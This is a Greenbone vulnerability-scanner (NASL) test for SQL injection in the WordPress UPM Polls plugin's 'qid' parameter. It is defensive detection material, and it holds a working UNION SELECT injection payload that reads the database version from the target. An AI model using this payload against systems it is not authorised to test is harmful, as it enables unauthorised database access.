# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802032");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-08-18 14:57:45 +0200 (Thu, 18 Aug 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress UPM Polls Plugin 'qid' Parameter SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/45535");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17627");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103755");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow an attacker to cause an SQL injection attack
  and gain sensitive information.");

  script_tag(name:"affected", value:"WordPress UPM Polls Plugin version 1.0.3 and prior.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input passed via
  the 'qid' parameter to '/wp-content/plugins/upm-polls/includes/poll_logs.php'
  allows attacker to manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"Update to UPM Polls WordPress plugin version 1.0.4 or later");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"WordPress UPM Polls Plugin is prone to an SQL injection vulnerability.");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/upm-polls/");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

useragent = http_get_user_agent();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

vtstrings = get_vt_strings();

path = dir + "/wp-content/plugins/upm-polls/includes/poll_logs.php?qid=" +
       "-1%20UNION%20ALL%20SELECT%20NULL,CONCAT(0x" + vtstrings["lowercase_hex"] +
       ",0x3a,@@version,0x3a,0x" + vtstrings["lowercase_hex"] + "),NULL,NULL,NULL,NULL--%20";

req = string("GET ", path, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Referer: http://", host, path, "\r\n", "\r\n");
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

if(eregmatch(pattern:vtstrings["lowercase"] + ":[0-9]+.*:" + vtstrings["lowercase"], string:res)) {
  report = http_report_vuln_url(port:port, url:path);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
